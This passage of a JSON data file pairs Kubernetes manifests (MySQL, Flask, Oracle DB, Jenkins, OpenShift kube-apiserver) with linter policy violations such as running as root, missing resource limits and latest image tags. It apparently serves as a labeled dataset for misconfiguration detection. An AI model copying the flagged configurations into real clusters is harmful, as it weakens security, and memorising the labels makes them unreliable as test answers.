    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql\n  labels:\n    app: mysql\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mysql\n  template:\n    metadata:\n      labels:\n        app: mysql\n    spec:\n      containers:\n      - image: mysql:5.6\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql\n              key: password\n        ports:\n        - containerPort: 3306\n          name: mysql\n        volumeMounts:\n        - name: mysql-persistent-storage\n          mountPath: /var/lib/mysql\n      volumes:\n      - name: mysql-persistent-storage\n        persistentVolumeClaim:\n          claimName: mysql-volumeclaim\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mysql\" is not set to runAsNonRoot"
  },
  {
    "id": "11194",
    "manifest_path": "data/manifests/the_stack_sample/sample_4306.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql\n  labels:\n    app: mysql\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mysql\n  template:\n    metadata:\n      labels:\n        app: mysql\n    spec:\n      containers:\n      - image: mysql:5.6\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql\n              key: password\n        ports:\n        - containerPort: 3306\n          name: mysql\n        volumeMounts:\n        - name: mysql-persistent-storage\n          mountPath: /var/lib/mysql\n      volumes:\n      - name: mysql-persistent-storage\n        persistentVolumeClaim:\n          claimName: mysql-volumeclaim\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mysql\" has cpu request 0"
  },
  {
    "id": "11195",
    "manifest_path": "data/manifests/the_stack_sample/sample_4306.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql\n  labels:\n    app: mysql\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mysql\n  template:\n    metadata:\n      labels:\n        app: mysql\n    spec:\n      containers:\n      - image: mysql:5.6\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql\n              key: password\n        ports:\n        - containerPort: 3306\n          name: mysql\n        volumeMounts:\n        - name: mysql-persistent-storage\n          mountPath: /var/lib/mysql\n      volumes:\n      - name: mysql-persistent-storage\n        persistentVolumeClaim:\n          claimName: mysql-volumeclaim\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mysql\" has memory limit 0"
  },
  {
    "id": "11196",
    "manifest_path": "data/manifests/the_stack_sample/sample_4307.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flask-dep\n  labels:\n    app: flask-helloworld\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: flask-helloworld\n  template:\n    metadata:\n      labels:\n        app: flask-helloworld\n    spec:\n      containers:\n      - name: flask\n        image: jamonation/flask-helloworld:latest\n        ports:\n        - containerPort: 5000\n        env:\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: host\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: name\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: pass\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: port\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: user\n        - name: REDIS_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: redis-config\n              key: host\n        - name: REDIS_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: redis-config\n              key: port\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"flask\" is using an invalid container image, \"jamonation/flask-helloworld:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11197",
    "manifest_path": "data/manifests/the_stack_sample/sample_4307.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flask-dep\n  labels:\n    app: flask-helloworld\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: flask-helloworld\n  template:\n    metadata:\n      labels:\n        app: flask-helloworld\n    spec:\n      containers:\n      - name: flask\n        image: jamonation/flask-helloworld:latest\n        ports:\n        - containerPort: 5000\n        env:\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: host\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: name\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: pass\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: port\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: user\n        - name: REDIS_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: redis-config\n              key: host\n        - name: REDIS_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: redis-config\n              key: port\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11198",
    "manifest_path": "data/manifests/the_stack_sample/sample_4307.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flask-dep\n  labels:\n    app: flask-helloworld\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: flask-helloworld\n  template:\n    metadata:\n      labels:\n        app: flask-helloworld\n    spec:\n      containers:\n      - name: flask\n        image: jamonation/flask-helloworld:latest\n        ports:\n        - containerPort: 5000\n        env:\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: host\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: name\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: pass\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: port\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: user\n        - name: REDIS_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: redis-config\n              key: host\n        - name: REDIS_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: redis-config\n              key: port\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"flask\" does not have a read-only root file system"
  },
  {
    "id": "11199",
    "manifest_path": "data/manifests/the_stack_sample/sample_4307.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flask-dep\n  labels:\n    app: flask-helloworld\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: flask-helloworld\n  template:\n    metadata:\n      labels:\n        app: flask-helloworld\n    spec:\n      containers:\n      - name: flask\n        image: jamonation/flask-helloworld:latest\n        ports:\n        - containerPort: 5000\n        env:\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: host\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: name\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: pass\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: port\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: user\n        - name: REDIS_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: redis-config\n              key: host\n        - name: REDIS_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: redis-config\n              key: port\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"flask\" is not set to runAsNonRoot"
  },
  {
    "id": "11200",
    "manifest_path": "data/manifests/the_stack_sample/sample_4307.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flask-dep\n  labels:\n    app: flask-helloworld\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: flask-helloworld\n  template:\n    metadata:\n      labels:\n        app: flask-helloworld\n    spec:\n      containers:\n      - name: flask\n        image: jamonation/flask-helloworld:latest\n        ports:\n        - containerPort: 5000\n        env:\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: host\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: name\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: pass\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: port\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: user\n        - name: REDIS_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: redis-config\n              key: host\n        - name: REDIS_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: redis-config\n              key: port\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"flask\" has cpu request 0"
  },
  {
    "id": "11201",
    "manifest_path": "data/manifests/the_stack_sample/sample_4307.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flask-dep\n  labels:\n    app: flask-helloworld\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: flask-helloworld\n  template:\n    metadata:\n      labels:\n        app: flask-helloworld\n    spec:\n      containers:\n      - name: flask\n        image: jamonation/flask-helloworld:latest\n        ports:\n        - containerPort: 5000\n        env:\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: host\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: name\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: pass\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: port\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres-secrets\n              key: user\n        - name: REDIS_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: redis-config\n              key: host\n        - name: REDIS_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: redis-config\n              key: port\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"flask\" has memory limit 0"
  },
  {
    "id": "11202",
    "manifest_path": "data/manifests/the_stack_sample/sample_4308.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: with-pod-affinity\n  annotations:\n    scheduler.alpha.kubernetes.io/affinity: \"{\\n  \\\"podAffinity\\\": {\\n    \\\"requiredDuringSchedulingIgnoredDuringExecution\\\"\\\n      : [\\n      {\\n        \\\"labelSelector\\\": {\\n          \\\"matchExpressions\\\":\\\n      \\ [\\n            {\\n              \\\"key\\\": \\\"security\\\",\\n              \\\"operator\\\"\\\n      : \\\"In\\\",\\n              \\\"values\\\": [\\\"S1\\\"]\\n            }\\n          ]\\n\\\n      \\        },\\n        \\\"topologyKey\\\": \\\"failure-domain.beta.kubernetes.io/zone\\\"\\\n      \\n     }\\n    ]\\n   },\\n  \\\"podAntiAffinity\\\": {\\n    \\\"requiredDuringSchedulingIgnoredDuringExecution\\\"\\\n      : [\\n      {\\n        \\\"labelSelector\\\": {\\n          \\\"matchExpressions\\\":\\\n      \\ [\\n            {\\n              \\\"key\\\": \\\"security\\\",\\n              \\\"operator\\\"\\\n      : \\\"In\\\",\\n              \\\"values\\\": [\\\"S2\\\"]\\n            }\\n          ]\\n\\\n      \\        },\\n        \\\"topologyKey\\\": \\\"kubernetes.io/hostname\\\"\\n     }\\n \\\n      \\   ]\\n   }\\n }\\n\"\nspec:\n  containers:\n  - name: with-pod-affinity\n    image: gcr.io/google_containers/pause:2.0\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"with-pod-affinity\" does not have a read-only root file system"
  },
  {
    "id": "11203",
    "manifest_path": "data/manifests/the_stack_sample/sample_4308.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: with-pod-affinity\n  annotations:\n    scheduler.alpha.kubernetes.io/affinity: \"{\\n  \\\"podAffinity\\\": {\\n    \\\"requiredDuringSchedulingIgnoredDuringExecution\\\"\\\n      : [\\n      {\\n        \\\"labelSelector\\\": {\\n          \\\"matchExpressions\\\":\\\n      \\ [\\n            {\\n              \\\"key\\\": \\\"security\\\",\\n              \\\"operator\\\"\\\n      : \\\"In\\\",\\n              \\\"values\\\": [\\\"S1\\\"]\\n            }\\n          ]\\n\\\n      \\        },\\n        \\\"topologyKey\\\": \\\"failure-domain.beta.kubernetes.io/zone\\\"\\\n      \\n     }\\n    ]\\n   },\\n  \\\"podAntiAffinity\\\": {\\n    \\\"requiredDuringSchedulingIgnoredDuringExecution\\\"\\\n      : [\\n      {\\n        \\\"labelSelector\\\": {\\n          \\\"matchExpressions\\\":\\\n      \\ [\\n            {\\n              \\\"key\\\": \\\"security\\\",\\n              \\\"operator\\\"\\\n      : \\\"In\\\",\\n              \\\"values\\\": [\\\"S2\\\"]\\n            }\\n          ]\\n\\\n      \\        },\\n        \\\"topologyKey\\\": \\\"kubernetes.io/hostname\\\"\\n     }\\n \\\n      \\   ]\\n   }\\n }\\n\"\nspec:\n  containers:\n  - name: with-pod-affinity\n    image: gcr.io/google_containers/pause:2.0\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"with-pod-affinity\" is not set to runAsNonRoot"
  },
  {
    "id": "11204",
    "manifest_path": "data/manifests/the_stack_sample/sample_4308.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: with-pod-affinity\n  annotations:\n    scheduler.alpha.kubernetes.io/affinity: \"{\\n  \\\"podAffinity\\\": {\\n    \\\"requiredDuringSchedulingIgnoredDuringExecution\\\"\\\n      : [\\n      {\\n        \\\"labelSelector\\\": {\\n          \\\"matchExpressions\\\":\\\n      \\ [\\n            {\\n              \\\"key\\\": \\\"security\\\",\\n              \\\"operator\\\"\\\n      : \\\"In\\\",\\n              \\\"values\\\": [\\\"S1\\\"]\\n            }\\n          ]\\n\\\n      \\        },\\n        \\\"topologyKey\\\": \\\"failure-domain.beta.kubernetes.io/zone\\\"\\\n      \\n     }\\n    ]\\n   },\\n  \\\"podAntiAffinity\\\": {\\n    \\\"requiredDuringSchedulingIgnoredDuringExecution\\\"\\\n      : [\\n      {\\n        \\\"labelSelector\\\": {\\n          \\\"matchExpressions\\\":\\\n      \\ [\\n            {\\n              \\\"key\\\": \\\"security\\\",\\n              \\\"operator\\\"\\\n      : \\\"In\\\",\\n              \\\"values\\\": [\\\"S2\\\"]\\n            }\\n          ]\\n\\\n      \\        },\\n        \\\"topologyKey\\\": \\\"kubernetes.io/hostname\\\"\\n     }\\n \\\n      \\   ]\\n   }\\n }\\n\"\nspec:\n  containers:\n  - name: with-pod-affinity\n    image: gcr.io/google_containers/pause:2.0\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"with-pod-affinity\" has cpu request 0"
  },
  {
    "id": "11205",
    "manifest_path": "data/manifests/the_stack_sample/sample_4308.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: with-pod-affinity\n  annotations:\n    scheduler.alpha.kubernetes.io/affinity: \"{\\n  \\\"podAffinity\\\": {\\n    \\\"requiredDuringSchedulingIgnoredDuringExecution\\\"\\\n      : [\\n      {\\n        \\\"labelSelector\\\": {\\n          \\\"matchExpressions\\\":\\\n      \\ [\\n            {\\n              \\\"key\\\": \\\"security\\\",\\n              \\\"operator\\\"\\\n      : \\\"In\\\",\\n              \\\"values\\\": [\\\"S1\\\"]\\n            }\\n          ]\\n\\\n      \\        },\\n        \\\"topologyKey\\\": \\\"failure-domain.beta.kubernetes.io/zone\\\"\\\n      \\n     }\\n    ]\\n   },\\n  \\\"podAntiAffinity\\\": {\\n    \\\"requiredDuringSchedulingIgnoredDuringExecution\\\"\\\n      : [\\n      {\\n        \\\"labelSelector\\\": {\\n          \\\"matchExpressions\\\":\\\n      \\ [\\n            {\\n              \\\"key\\\": \\\"security\\\",\\n              \\\"operator\\\"\\\n      : \\\"In\\\",\\n              \\\"values\\\": [\\\"S2\\\"]\\n            }\\n          ]\\n\\\n      \\        },\\n        \\\"topologyKey\\\": \\\"kubernetes.io/hostname\\\"\\n     }\\n \\\n      \\   ]\\n   }\\n }\\n\"\nspec:\n  containers:\n  - name: with-pod-affinity\n    image: gcr.io/google_containers/pause:2.0\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"with-pod-affinity\" has memory limit 0"
  },
  {
    "id": "11206",
    "manifest_path": "data/manifests/the_stack_sample/sample_4312.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: orcldb\n  labels:\n    app: oracledb\nspec:\n  selector:\n    matchLabels:\n      app: oracledb\n  template:\n    metadata:\n      labels:\n        app: oracledb\n    spec:\n      containers:\n      - image: daniel570/oracledb:18.3.0-ee\n        name: orcldb\n        ports:\n        - containerPort: 1521\n          name: orcldb\n        volumeMounts:\n        - name: data\n          mountPath: /opt/oracle/oradata\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 54321\n        fsGroup: 54321\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: data-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"orcldb\" does not have a read-only root file system"
  },
  {
    "id": "11207",
    "manifest_path": "data/manifests/the_stack_sample/sample_4312.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: orcldb\n  labels:\n    app: oracledb\nspec:\n  selector:\n    matchLabels:\n      app: oracledb\n  template:\n    metadata:\n      labels:\n        app: oracledb\n    spec:\n      containers:\n      - image: daniel570/oracledb:18.3.0-ee\n        name: orcldb\n        ports:\n        - containerPort: 1521\n          name: orcldb\n        volumeMounts:\n        - name: data\n          mountPath: /opt/oracle/oradata\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 54321\n        fsGroup: 54321\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: data-pvc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"orcldb\" has cpu request 0"
  },
  {
    "id": "11208",
    "manifest_path": "data/manifests/the_stack_sample/sample_4312.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: orcldb\n  labels:\n    app: oracledb\nspec:\n  selector:\n    matchLabels:\n      app: oracledb\n  template:\n    metadata:\n      labels:\n        app: oracledb\n    spec:\n      containers:\n      - image: daniel570/oracledb:18.3.0-ee\n        name: orcldb\n        ports:\n        - containerPort: 1521\n          name: orcldb\n        volumeMounts:\n        - name: data\n          mountPath: /opt/oracle/oradata\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 54321\n        fsGroup: 54321\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: data-pvc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"orcldb\" has memory limit 0"
  },
  {
    "id": "11209",
    "manifest_path": "data/manifests/the_stack_sample/sample_4313.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: jenkins-ui\n  namespace: jenkins\nspec:\n  clusterIP: None\n  selector:\n    app: jenkins-server\n  ports:\n  - name: jenkins-ui\n    protocol: TCP\n    port: 8080\n    targetPort: 8080\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:jenkins-server])"
  },
  {
    "id": "11210",
    "manifest_path": "data/manifests/the_stack_sample/sample_4318.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: openshift-kube-apiserver\n  name: kube-apiserver\n  labels:\n    app: openshift-kube-apiserver\n    apiserver: 'true'\n    revision: REVISION\nspec:\n  initContainers:\n  - name: setup\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    command:\n    - /usr/bin/timeout\n    - '105'\n    - /bin/bash\n    - -ec\n    args:\n    - \"echo -n \\\"Fixing audit permissions.\\\"\\nchmod 0700 /var/log/kube-apiserver\\n\\\n      echo -n \\\"Waiting for port :6443 to be released.\\\"\\nwhile [ -n \\\"$(lsof -ni\\\n      \\ :6443)\\\" ]; do\\n  echo -n \\\".\\\"\\n  sleep 1\\ndone\\n\"\n  containers:\n  - name: kube-apiserver-REVISION\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - hypershift\n    - openshift-kube-apiserver\n    args:\n    - --config=/etc/kubernetes/static-pod-resources/configmaps/config/config.yaml\n    resources:\n      requests:\n        memory: 1Gi\n        cpu: 150m\n    ports:\n    - containerPort: 6443\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    livenessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 45\n      timeoutSeconds: 10\n    readinessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 10\n      timeoutSeconds: 10\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: STATIC_POD_VERSION\n      value: REVISION\n  - name: kube-apiserver-cert-syncer-REVISION\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    image: ${OPERATOR_IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - cluster-kube-apiserver-operator\n    - cert-syncer\n    args:\n    - --kubeconfig=/etc/kubernetes/static-pod-resources/configmaps/kube-apiserver-cert-syncer-kubeconfig/kubeconfig\n    - --namespace=$(POD_NAMESPACE)\n    - --destination-dir=/etc/kubernetes/static-pod-certs\n    resources:\n      requests:\n        memory: 50Mi\n        cpu: 10m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-pod-REVISION\n    name: resource-dir\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-certs\n    name: cert-dir\n  - hostPath:\n      path: /var/log/kube-apiserver\n    name: audit-dir\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "11211",
    "manifest_path": "data/manifests/the_stack_sample/sample_4318.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: openshift-kube-apiserver\n  name: kube-apiserver\n  labels:\n    app: openshift-kube-apiserver\n    apiserver: 'true'\n    revision: REVISION\nspec:\n  initContainers:\n  - name: setup\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    command:\n    - /usr/bin/timeout\n    - '105'\n    - /bin/bash\n    - -ec\n    args:\n    - \"echo -n \\\"Fixing audit permissions.\\\"\\nchmod 0700 /var/log/kube-apiserver\\n\\\n      echo -n \\\"Waiting for port :6443 to be released.\\\"\\nwhile [ -n \\\"$(lsof -ni\\\n      \\ :6443)\\\" ]; do\\n  echo -n \\\".\\\"\\n  sleep 1\\ndone\\n\"\n  containers:\n  - name: kube-apiserver-REVISION\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - hypershift\n    - openshift-kube-apiserver\n    args:\n    - --config=/etc/kubernetes/static-pod-resources/configmaps/config/config.yaml\n    resources:\n      requests:\n        memory: 1Gi\n        cpu: 150m\n    ports:\n    - containerPort: 6443\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    livenessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 45\n      timeoutSeconds: 10\n    readinessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 10\n      timeoutSeconds: 10\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: STATIC_POD_VERSION\n      value: REVISION\n  - name: kube-apiserver-cert-syncer-REVISION\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    image: ${OPERATOR_IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - cluster-kube-apiserver-operator\n    - cert-syncer\n    args:\n    - --kubeconfig=/etc/kubernetes/static-pod-resources/configmaps/kube-apiserver-cert-syncer-kubeconfig/kubeconfig\n    - --namespace=$(POD_NAMESPACE)\n    - --destination-dir=/etc/kubernetes/static-pod-certs\n    resources:\n      requests:\n        memory: 50Mi\n        cpu: 10m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-pod-REVISION\n    name: resource-dir\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-certs\n    name: cert-dir\n  - hostPath:\n      path: /var/log/kube-apiserver\n    name: audit-dir\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"kube-apiserver-REVISION\" is using an invalid container image, \"${IMAGE}\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11212",
    "manifest_path": "data/manifests/the_stack_sample/sample_4318.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: openshift-kube-apiserver\n  name: kube-apiserver\n  labels:\n    app: openshift-kube-apiserver\n    apiserver: 'true'\n    revision: REVISION\nspec:\n  initContainers:\n  - name: setup\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    command:\n    - /usr/bin/timeout\n    - '105'\n    - /bin/bash\n    - -ec\n    args:\n    - \"echo -n \\\"Fixing audit permissions.\\\"\\nchmod 0700 /var/log/kube-apiserver\\n\\\n      echo -n \\\"Waiting for port :6443 to be released.\\\"\\nwhile [ -n \\\"$(lsof -ni\\\n      \\ :6443)\\\" ]; do\\n  echo -n \\\".\\\"\\n  sleep 1\\ndone\\n\"\n  containers:\n  - name: kube-apiserver-REVISION\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - hypershift\n    - openshift-kube-apiserver\n    args:\n    - --config=/etc/kubernetes/static-pod-resources/configmaps/config/config.yaml\n    resources:\n      requests:\n        memory: 1Gi\n        cpu: 150m\n    ports:\n    - containerPort: 6443\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    livenessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 45\n      timeoutSeconds: 10\n    readinessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 10\n      timeoutSeconds: 10\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: STATIC_POD_VERSION\n      value: REVISION\n  - name: kube-apiserver-cert-syncer-REVISION\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    image: ${OPERATOR_IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - cluster-kube-apiserver-operator\n    - cert-syncer\n    args:\n    - --kubeconfig=/etc/kubernetes/static-pod-resources/configmaps/kube-apiserver-cert-syncer-kubeconfig/kubeconfig\n    - --namespace=$(POD_NAMESPACE)\n    - --destination-dir=/etc/kubernetes/static-pod-certs\n    resources:\n      requests:\n        memory: 50Mi\n        cpu: 10m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-pod-REVISION\n    name: resource-dir\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-certs\n    name: cert-dir\n  - hostPath:\n      path: /var/log/kube-apiserver\n    name: audit-dir\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"kube-apiserver-cert-syncer-REVISION\" is using an invalid container image, \"${OPERATOR_IMAGE}\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11213",
    "manifest_path": "data/manifests/the_stack_sample/sample_4318.yaml",
